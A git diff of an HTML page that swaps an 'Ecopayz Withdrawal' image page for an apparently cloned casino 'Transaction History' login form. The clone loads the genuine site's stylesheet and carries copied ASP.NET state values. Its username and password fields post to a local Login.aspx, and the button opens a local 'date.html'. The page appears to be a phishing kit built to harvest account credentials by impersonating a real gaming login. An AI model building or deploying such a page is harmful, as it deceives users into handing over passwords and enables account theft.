@@ -1,17 +1,138 @@
-<!DOCTYPE html>
-<html>
-
-  <head>
-    <meta charset='utf-8' />
-    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
-
-    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
-
-    <title>Ecopayz Withdrawal</title>
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+    <link rel="stylesheet" href="https://accounts2.gameassists.co.uk/cashcheck/resources/css/cashcheck.css" type="text/css">
+    
+    <title>Transaction History</title>
+    <script language="javascript" type="text/javascript">
+      function PostOn()
+      {
+        document.StatementsForm.submit();
+      }
+      
+      function LoadingComplete()
+      {
+        document.getElementById('status').style.display = 'none';
+        document.getElementById('content').style.display = '';
+      }
+      
+      function Loading()
+      {
+        document.getElementById('content').style.display = 'none';
+        document.getElementById('status').style.display = '';
+      }
+      
+      function setHeight()
+      {
+        if (self.innerHeight) //All except Explorer.
+        {
+          document.getElementById('content').style.height = self.innerHeight;
+        }
+        else if (document.documentElement && document.documentElement.clientHeight) //Strict Mode IE.
+        {
+          document.getElementById('content').style.height = document.documentElement.clientHeight - 3;
+        }
+        else if (document.body) //Other Explorers.
+        {
+          document.getElementById('content').style.height = document.body.clientHeight;
+        }
+      }
+      
+      function ReturnToLobby()
+      {
+        window.close();
+      }
+    </script>
   </head>
+  
+  <body class="content" onload="Loader();">
+    <table class="headerborder" cellspacing="0" cellpadding="0" width="100%">
+      <tbody><tr>
+        <td align="center" class="header">Transaction History</td>
+      </tr>
+      <tr>
+        <td align="center" class="header_spacer">&nbsp;</td>
+      </tr>
+      <tr>
+        <td align="center" class="titlebar">You need to log in to access your statements</td>
+      </tr>
+    </tbody></table>
+    <br>
+    <table width="100%" border="0" cellpadding="0" cellspacing="0">
+      <tbody><tr>
+        <td class="pad_info_td">
+          <form name="form1" method="post" action="Login.aspx" id="form1" onsubmit="window.parent.Loading();">
+<div>
+<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTIwNjk0OTExMjQPFgYeB2Nzc3BhdGgFSWh0dHBzOi8vYWNjb3VudHMyLmdhbWVhc3Npc3RzLmNvLnVrL2Nhc2hjaGVjay9yZXNvdXJjZXMvY3NzL2Nhc2hjaGVjay5jc3MeAmh0FwkFBkhlYWRlcgUTVHJhbnNhY3Rpb24gSGlzdG9yeQUbVmFsaWRhdGlvbiBFcnJvciAtIFBhc3N3b3JkBRdQbGVhc2UgZW50ZXIgYSBwYXNzd29yZAUERXhpdAUPUmV0dXJuIHRvIGxvYmJ5BQhQYXNzd29yZAUIUGFzc3dvcmQFBUxvZ2luBQZMb2cgaW4FBUV4aXQyBQRFeGl0BRtWYWxpZGF0aW9uIEVycm9yIC0gVXNlcm5hbWUFLlBsZWFzZSBlbnRlciBhIHZhbGlkIHVzZXIgYWNjb3VudCBhbmQgcGFzc3dvcmQFCFVzZXJuYW1lBQxVc2VyIEFjY291bnQFC1BhZ2UgSGVhZGVyBSxZb3UgbmVlZCB0byBsb2cgaW4gdG8gYWNjZXNzIHlvdXIgc3RhdGVtZW50cx4RaHRfU2VhcmNoQ3JpdGVyaWEXIwUHTW9udGguMQUDSmFuBR9WYWxpZGF0aW9uIC0gU3RhcnQgRGF0ZSBHcmVhdGVyBS5Zb3VyIHN0YXJ0IGRhdGUgaXMgZ3JlYXRlciB0aGFuIHlvdXIgZW5kIGRhdGUuBRBUcmFuc2FjdGlvbiBUeXBlBRBUcmFuc2FjdGlvbiBUeXBlBRBUcmFuc2FjdGlvblR5cGU2BQVCb251cwUHTW9udGguMgUDRmViBRNTdGF0ZW1lbnQgVHlwZSBDYXJkBQRDYXJkBRFGaW5hbmNpYWwgQWNjb3VudAUHQWNjb3VudAUITW9udGguMTEFA05vdgUERGF0ZQUERGF0ZQUQVHJhbnNhY3Rpb25UeXBlMQUDQWxsBQdTb3J0IEJ5BQdTb3J0IEJ5BQhNb250aC4xMgUDRGVjBQRFeGl0BQ9SZXR1cm4gdG8gbG9iYnkFDlN0YXRlbWVudCBUeXBlBQ5TdGF0ZW1lbnQgVHlwZQUaVmFsaWRhdGlvbiAtIEludmFsaWQgRGF0ZXMFGlBsZWFzZSBlbnRlciBhIHZhbGlkIGRhdGUuBQpTdGFydCBEYXRlBQpTdGFydCBEYXRlBRBUcmFuc2FjdGlvblR5cGU1BQ9DdXJyZW5jeSBDaGFuZ2UFEFRyYW5zYWN0aW9uVHlwZTMFE0JhbGFuY2UgQWRqdXN0bWVudHMFB01vbnRoLjgFA0F1ZwUGSGVhZGVyBRNUcmFuc2FjdGlvbiBIaXN0b3J5BQdNb250aC4zBQNNYXIFCE1vbnRoLjEwBQNPY3QFB01vbnRoLjkFA1NlcAUFRXhpdDIFBEV4aXQFCEVuZCBEYXRlBQhFbmQgRGF0ZQUHTW9udGguNAUDQXByBQ5TaG93IFN0YXRlbWVudAUOU2hvdyBTdGF0ZW1lbnQFElN0YXRlbWVudCBUeXBlIEFsbAUDQWxsBQhVc2VybmFtZQUMVXNlciBBY2NvdW50BQdNb250aC41BQNNYXkFEFRyYW5zYWN0aW9uVHlwZTQFB0RlcG9zaXQFEFRyYW5zYWN0aW9uVHlwZTIFCldpdGhkcmF3YWwFC1BhZ2UgSGVhZGVyBQ9TZWFyY2ggQ3JpdGVyaWEFB01vbnRoLjcFA0p1bAUHTW9udGguNgUDSnVuFgJmD2QWBmYPDxYCHgRUZXh0ZWRkAgIPZBYCAgEPZBYCZg8PFgIfA2VkZAIEDw8WAh8DBQZMb2cgaW5kZGQPUrwgmzW461Ve8ie7ui7BPnObhg==">
+</div>
 
-  <body>
-<img src="Imagenes/img.png" alt=”ecopayz” width=”1366” height=”768”/>
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
 
-  </body>
-</html>
+
+<script src="/cashcheck/WebResource.axd?d=t5ooCl7bcfCfEmx9EaYSfR9y9USetUgwndnsUBOJMnifqGqnpnHiuKensauxRNQkQzPcMEsu3zfNMKMLxAUhIX7LIhw1&amp;t=635589435467565191" type="text/javascript"></script>
+
+
+<script src="/cashcheck/WebResource.axd?d=KI0itGL5XROmXvJbGkMm496qV-NAuv0TCYl9wLbVMCFChpEjxmUQjFCZZyLGHQibvyEeuM8dNtgx6a3jdsippLnW9Jg1&amp;t=635589435467565191" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C7604A8B">
+	<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+	<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWBAKOlOG8BQK83fBAAtmGnIgOAoLch4YM+w2Ytpa5vJFoKo+JTnsq4eXGW1s=">
+</div>
+            <div>
+              <table border="0" align="left" class="TableLogin">
+                <tbody><tr>
+                  <td align="left" class="InstructionText_lft">&nbsp;</td>
+                  <td align="left" class="error_txt"><span id="lblErrorTxt"></span> &nbsp;</td>
+                </tr>
+                <tr>
+                  <td align="left" class="InstructionText_lft">User Account</td>
+                  <td align="left">
+                    <input name="txtBoxUserName" type="text" size="20" id="txtBoxUserName" style="width:160px;">
+                  </td>
+                </tr>
+                
+                <tr>
+                  <td align="left" class="InstructionText_lft">Password</td>
+                  <td align="left">
+                    <input name="txtBoxPassword" type="password" size="20" id="txtBoxPassword" style="width:160px;">
+                  </td>
+                </tr>
+                <tr>
+                  <td align="center">&nbsp;</td>
+                  <td align="left">
+                    <input type="submit" name="btnLogin" value="Log in" onclick="window.open('date.html')" id="btnLogin">
+                    
+                  </td>
+                </tr>
+              </tbody></table>
+            </div>
+          
+
+<script type="text/javascript">
+//<![CDATA[
+WebForm_AutoFocus('txtBoxUserName');//]]>
+</script>
+</form>
+        </td>
+      </tr>
+    </tbody></table>
+  
+
+</body></html>
